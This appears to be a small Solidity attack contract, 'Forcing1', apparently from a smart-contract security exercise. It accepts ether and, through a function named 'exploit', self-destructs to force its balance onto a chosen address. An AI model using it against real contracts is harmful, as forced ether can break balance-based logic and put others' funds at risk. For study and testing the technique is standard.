pragma solidity ^0.4.20;

contract Forcing1 {
    address public to;

    function Forcing1(address _to) public payable {
        to = _to;
    }

    function() public payable {
    }

    function exploit() public payable {
        selfdestruct(to);
    }
}

